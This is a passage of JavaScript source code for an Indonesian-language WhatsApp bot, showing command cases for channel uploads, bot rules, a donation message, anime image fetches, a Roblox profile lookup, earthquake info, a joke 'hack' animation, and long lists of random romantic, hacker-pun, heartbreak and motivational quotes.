						Denzy.sendMessage(channel, {
					contextInfo: {
						
		        externalAdReply: {
						showAdAttribution: true,
						title: pelers,
						mediaType: 1,
						previewType: 1,
						body: 'Massage to channel',
						thumbnail: fotoProfil,
					    renderLargerThumbnail: false,
						mediaUrl: '',
					    sourceUrl: ''
			        }
			        },
							video: media,
							caption: text ? text : defaultCaption
						})
						reply(`🎥 Video successfully uploaded to channel with caption: "${text ? text : defaultCaption}"`)
					} else if (/audio/.test(mime)) {
						Denzy.sendMessage(channel, {
					contextInfo: {
						
		        externalAdReply: {
						showAdAttribution: true,
						title: pelers,
						mediaType: 1,
						previewType: 1,
						body: 'Massage to channel',
						thumbnail: fotoProfil,
					    renderLargerThumbnail: false,
						mediaUrl: '',
					    sourceUrl: ''
			        }
			        },
							audio: media,
							mimetype: mime,
							ptt: true
						})
						reply(`🎵 Audio successfully uploaded to the channel, sis!`)
					} else if (/text/.test(mime) || text) {
						Denzy.sendMessage(channel, {
					contextInfo: {
						
		        externalAdReply: {
						showAdAttribution: true,
						title: pelers,
						mediaType: 1,
						previewType: 1,
						body: 'Massage to channel',
						thumbnail: fotoProfil,
					    renderLargerThumbnail: false,
						mediaUrl: '',
					    sourceUrl: ''
			        }
			        },
							text: text ? text : defaultCaption
						})
						reply(`💬 Text message successfully sent to channel: "${text ? text : defaultCaption}"`)
					} else {
						reply(`Hmm... I don't know what kind of media this is. Please check again, sis! 🧐`)
					}
				} catch (error) {
					console.error(error)
					reply(`Oh, sis! 😣 There was a problem uploading to the channel. Try again later, OK!`)
				}
			}
			break
			case 'rules': {
  const cap = `┏━━━°❀ ❬ *Rules ${namaBot} MultiDevice* ❭ ❀°━━━┓

1. ✧ *Dilarang Melakukan Spam Kepada Bot*, Jika Ketahuan Akan Di Banned.

2. ✧ Jika Bot Tidak Menjawab 1x, Silahkan Dicoba Lagi. Tapi Jika Bot Tidak Menjawab 2x, Itu Artinya Delay, Jangan Dipakai Dulu.

3. ✧ *Jangan Spam Bot, Kalau Belum Donasi, Sadar Diri Aja Makenya* :)

4. ✧ Jika Limit Habis, Silahkan Bermain Game Untuk Mendapatkan Exp. Contoh Game: Tebak-Tebakan, RPG Game, dll.

5. ✧ *Dilarang Mengirim Virtex/Bug Ke Bot*, Walaupun Tidak Ada Efeknya :v

6. ✧ *Dilarang Keras Menelpon Bot*, Jika Menelpon Akan Otomatis Diblokir.

7. ✧ Jika Tidak Mengerti Cara Menggunakan Bot, Silahkan Bertanya Pada Member Lain. Atau Jika Belum Join Group Bot, Ketik #gcbot Dan Masuk Group Bot.

8. ✧ Jika Ada Fitur Error/Tidak Mengerti Cara Menggunakannya, Silahkan Laporkan/Tanyakan Kepada Owner.

9. ✧ Jika Bot Delay, Jangan Di Spam Terlebih Dahulu.

10. ✧ Untuk User *Premium*, *Dilarang Keras Mengirim Bug Asal Ke Orang Lain*.

┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`
reply(cap)
}
break
case 'donasi': {
const url = "https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg";
  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: Denzy.waUploadToServer
    });
    return imageMessage;
  }
  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `> halo kak ${pushname}`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './Denzy.jpg'
              } }, { upload: Denzy.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol  di bawah untuk\n> Melihat Chanel Denzy In Here ` },
                  nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Lihat Chanel( Denzy In Here  )","url":"https://whatsapp.com/channel/0029VbAlvk9Fsn0boxiHJX0H","merchant_url":"https://whatsapp.com/channel/0029VbAlvk9Fsn0boxiHJX0H"}`
                    },
                  ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: qkontak }
  );

  await Denzy.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break
case 'randomsfw':
case 'kill':
case 'pat':
case 'lick':
case 'bite':
case 'yeet':
case 'bonk':
case 'wink':
case 'poke':
case 'nom':
case 'slap':
case 'smile':
case 'wave':
case 'blush':
case 'smug':
case 'glomp':
case 'happy':
case 'dance':
case 'cringe':
case 'highfive':
case 'handhold':
  reply('.(list), (listsfw) List sfw :kill, pat, lick, bite, yeet, bonk, wink, poke, nom, slap, smile, wave, blush, smug, glomp, happy, dance, cringe, highfive, handhold ')
  await loading();
  axios.get(`https://api.waifu.pics/sfw/${command}`)
    .then(({ data }) => {
      Denzy.sendMessage(from, { 
        image: { url: data.url }, 
        caption: 'Success Coy' 
      }, { quoted: qkontak });
    })
    .catch((err) => {
      console.error(err);
      Denzy.sendMessage(from, { text: 'Terjadi kesalahan, coba lagi nanti.' }, { quoted: qkontak });
    });
  break
  case 'robloxstalk': {
    const userId = "user_id_yang_diberikan"; // Ganti dengan userId yang sesuai

    async function ui(userId) {
        const url = `https://users.roblox.com/v1/users/${userId}`;
        try {
            const response = await cloudscraper.get(url);
            return JSON.parse(response);
        } catch {
            return null;
        }
    }

    async function us(userId) {
        const url = `https://users.roblox.com/v1/users/${userId}/social`;
        try {
            const response = await cloudscraper.get(url);
            return JSON.parse(response);
        } catch {
            return null;
        }
    }

    async function uin(userId) {
        const url = `https://inventory.roblox.com/v1/users/${userId}/inventory`;
        try {
            const response = await cloudscraper.get(url);
            return JSON.parse(response);
        } catch {
            return null;
        }
    }

    async function up(userId) {
        const url = "https://presence.roblox.com/v1/presence/users";
        const payload = {
            userIds: [userId]
        };
        try {
            const response = await cloudscraper.post(url, {
                json: payload
            });
            return JSON.parse(response);
        } catch {
            return null;
        }
    }

    async function ugp(userId) {
        const url = `https://groups.roblox.com/v1/users/${userId}/groups/roles`;
        try {
            const response = await cloudscraper.get(url);
            return JSON.parse(response);
        } catch {
            return null;
        }
    }

    async function robloxStalk(userId) {
        const userInfo = await ui(userId);
        const userSocials = await us(userId);
        const userInventory = await uin(userId);
        const userPresence = await up(userId);
        const userGroups = await ugp(userId);

        return {
            userInfo,
            userSocials,
            userInventory,
            userPresence,
            userGroups,
        };
    }
    const result = await robloxStalk(userId);
    if (result) {
        m.reply(`User  Info: ${JSON.stringify(result.userInfo)}\nSocials: ${JSON.stringify(result.userSocials)}\nInventory: ${JSON.stringify(result.userInventory)}\nPresence: ${JSON.stringify(result.userPresence)}\nGroups: ${JSON.stringify(result.userGroups)}`);
    } else {
        m.reply("Gagal mendapatkan data pengguna.");
    }
}
break;
  case "cekgempa":
case "infogempa": {
    Reply("cocote"); // Mengirim pesan "sedang memuat"
    try {
        const anu = `https://api.agatz.xyz/api/gempa`;
        const res = await fetch(anu);
        const response = await res.json();
        if (!response || !response.data) {
            throw new Error("Tidak dapat mengambil data gempa.");
        }

        let iclik = `
Wilayah: ${response.data.wilayah || "Tidak diketahui"}
Tanggal: ${response.data.tanggal || "Tidak diketahui"}
Kedalaman: ${response.data.kedalaman || "Tidak diketahui"}
Waktu: ${response.data.waktu || "Tidak diketahui"}
Potensi: ${response.data.potensi || "Tidak diketahui"}
Dirasakan: ${response.data.dirasakan || "Tidak diketahui"}
Magnitudo: ${response.data.magnitune || "Tidak diketahui"}`;

        await Denzy.sendMessage(m.chat, { text: iclik }, { quoted: qkontak });
    } catch (e) {
        console.error(e); // Log error ke console
        m.reply("Ups, terjadi kesalahan saat mengambil informasi gempa. Coba lagi nanti!");
    }
}
break;
case "hackwa": {
    let teks = `🔍 *Memulai proses hack WhatsApp...*\n\n⏳ Menghubungkan ke server...\n📡 Mengakses database...\n🔑 Mengambil kode OTP...\n🛑 *Wowkwk Gimik doang bg ya kali beneran 😭*`;

    setTimeout(() => { m.reply(teks); }, 2000);
};
break;
case 'quoteshacker': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const heker = [
  "Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?",
  "Aku rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.",
  "Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.",
  "berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.",
  "Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg open_basedir enabled.",
  "Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.",
  "Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.",
  "Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.",
  "Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |",
  "Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile",
  "Aku deketin kamu cuma untuk redirect ke hati temenmu.",
  "Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?",
  "Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad",
  "kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain",
  "Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin",
  "Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().",
  "SQLI ( Structured Query Love Injection )",
  "aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu",
  "Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.",
  "kamu adalah terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile",
  "Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.",
  "hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.",
  "Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.",
  "Jangan men-dualboot-kan hatiku kepadamu.",
  "cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.",
  "KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.",
  "Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku",
  "cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!"
]

let bacotan = pickRandom(heker)
  reply(bacotan)
}
break
case 'quotesgombal': {
    function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const gombal = [
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "Seandainya sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "Aku gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "Kamu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "Kalausaja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "denganambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta.",
    "Kalo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku harap kamu tidak menanyakan hal terindah yang pernah singgah di kehidupanku, karena jawaban nya adalah kamu.",
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "seandainyaa sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "kuu gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "kamuu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "jikaa saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "atuu tambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta,.",
    "aloo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku tak pernah berjanji untuk sebuah perasaan, namun aku berusaha berjanji untuk sebuah kesetiaan.",
    "Aku sangat berharap kamu tau, kalau aku tidak pernah menyesali cintaku untuk mu, karena bagiku memiliki kamu sudah cukup bagi ku.",
    "Jangankan memilikimu, mendengar kamu kentut aja aku sudah bahagia.",
    "Aku mohon jangan jalan-jalan terus di pikiranku, duduk yang manis di hatiku saja.",
    "Berulang tahun memang indah, namun bagiku yang lebih indah jika berulang kali bersamamu.",
    "Napas aku kok sesek banget ya?, karena separuh nafasku ada di kamu.",
    "Jika ada seseorang lebih memilih pergi meninggalkan kamu, jangan pernah memohon padanya untuk tetap bertahan. Karena jika dia cinta, dia tak akan mau pergi.",
    "jangann diam aja dong, memang diam itu emas, tapi ketahuilah suara kamu itu seperti berlian.",
    "Kesasar itu serasa rugi banget, namun aku nggak merasa rugi karena cintaku sudah Biasanya orang yang lagi nyasar itu rugi ya, tapi tau gak? Aku gak merasa rugi sebab cintaku sudah nyasar ke hati bidadari.",
    "Ada 3 hal yang paling aku sukai di dunia ini, yaitu Matahari, Bulan dan Kamu. Matahari untuk siang hari, Bulan untuk malam hari dan Kamu untuk selamanya dihatiku.",
    "Sayang, kamu itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya.",
    "kuu gak perlu wanita yang sholeha, tapi bagaimana menuntun wanita yang aku cintai menjadi seorang yang sholehah.",
    "Aku tidak minta bintang atau bulan kepadamu. Cukup temani aku selamanya di bawah cahayanya.",
    "Akuana kalo kita berdua jadi komplotan penjahat: Aku mencuri hatimu, dan kamu mencuri hatiku?",
    "Aku gak perlu wanita yang cantik, tapi bagaimana aku menyanjung wanita yang aku cintai seperti wanita yang paling cantik di bumi ini.",
    "Aku pengen bersamamu cuma pada dua waktu: SEKARANG dan SELAMANYA.",
    "Akuu tuh bikin aku ga bisa tidur tau ga?",
    "Soalnya kamu selalu ada dibayang-bayang aku terus.",
    "Jika aku bisa jadi bagian dari dirimu,aku mau jadi air matamu,yang tersimpan di hatimu, lahir dari matamu, hidup di pipimu, dan mati di bibirmu.",
    "Papa kamu pasti kerja di apotik ya? | kenapa bang? | karena cuma kamu obat sakit hatiku.",
    "akuu selalu berusaha tak menangis karenamu, karena setiap butir yang jatuh, hanya makin mengingatkan, betapa aku tak bisa melepaskanmu.",
    "mauu nanya jalan nih. Jalan ke hatimu lewat mana ya?",
    "Andai sebuah bintang akan jatuh setiap kali aku mengingatmu, bulan pasti protes. Soalnya dia bakal sendirian di angkasa.",
    "Andai kamu gawang aku bolanya. Aku rela ditendang orang-orang demi aku dapat bersamamu,",
    "Dingin malam ini menusuk tulang. Kesendirian adalah kesepian. Maukah kau jadi selimut penghangat diriku?",
    "Keindahan Borobudur keajaiban dunia, keindahan kamu keajaiban cinta.",
    "Aku ingin mengaku dosa. Jangan pernah marah ya. Maafkan sebelumnya. Tadi malam aku mimpiin kamu jadi pacarku. Setelah bangun, akankah mimpiku jadi nyata?",
    "Kalau nggak sih aku bilang aku cinta kamu hari ini? Kalau besok gimana? Besok lusa? Besoknya besok lusa? Gimana kalau selamanya?",
    "Orangtuamu pengrajin bantal yah? Karena terasa nyaman jika di dekatmu.",
    "Jika malam adalah jeruji gelap yang menjadi sangkar, saya ingin terjebak selamanya di sana bersamamu.",
    "Sekarang aku gendutan gak sih? Kamu tau gak kenapa ? Soalnya kamu sudah mengembangkan cinta yang banyak di hatiku.",
    "Di atas langit masih ada langit. Di bawah langit masih ada aku yang mencintai kamu.",
    "Tau tidak kenapa malam ini tidak ada bintang? Soalnya bintangnya pindah semua ke matamu?",
    "Aku mencintaimu! Jika kamu benci aku, panah saja diriku. Tapi jangan di hatiku ya, karena di situ kamu berada.",
    "Bapak kamu pasti seorang astronot? | kok tau? | Soalnya aku melihat banyak bintang di matamu.",
    "Bapak kamu dosen ya? | kok tau? | karena nilai kamu A+ di hatiku.",
    "Kamu pasti kuliah di seni pahat ya? | kok tau sih? | Soalnya kamu pintar sekali memahat namamu di hatiku.",
    "Ya Tuhan, jika dia jodohku, menangkanlah tender pembangunan proyek menara cintaku di hatinya.",
    "Kamu mantan pencuri ya? | kok tau? | Abisnya kamu mencuri hatiku sih!",
    "Cowok : Aku suka senyum-senyum sendiri lho. | Cewek : Hah .. Gila Ya | Cowok : Nggak. Aku sedang mikirin kamu.",
    "Setiap malam aku berjalan-jalan di suatu tempat. Kamu tau di mana itu ? | gatau, emang dimana? | Di hatimu.",
    "Kamu pake Telkomesl ya? Karena sinyal-sinyal cintamu sangat kuat sampai ke hatiku.",
    "Kamu tahu gak sih? AKu tuh capek banget. Capek nahan kangen terus sama kamu.",
    "katanyaa kalau sering hujan itu bisa membuat seseorang terhanyut, kalau aku sekarang sedang terhanyut di dalam cintamu.",
    "Aku harap kamu jangan pergi lagi ya? karena, bila aku berpisah dengamu sedetik saja bagaikan 1000 tahun rasanya.",
    "Aku sih gak butuh week end, yang aku butuhkan hanyalah love you till the end.",
    "Emak kamu tukang Gado gado ya?, kok tau sih?, Pantesan saja kamu telah mencampur adukan perasaanku",
    "Walau hari ini cerah, tetapi tanpa kamu disisiku sama saja berselimutkan awan gelap di hati ini",
    "Kamu ngizinin aku kangen sehari berapa kali neng? Abang takut over dosis.",
    "cintaa aku ke kamu tuh bagaikan hutang, awalnya kecil, lama-lama didiemin malah tambah gede.",
    "Berulang tahun adalah hari yang indah. Tapih akin lebih indah kalo udah berulang-ulang kali bersama kamu."
]
let bacotan = pickRandom(gombal)
  reply(bacotan)

}
break
case 'quotesgalau': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  reply(bacotan)
}
break
case 'quotesmotivasi': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
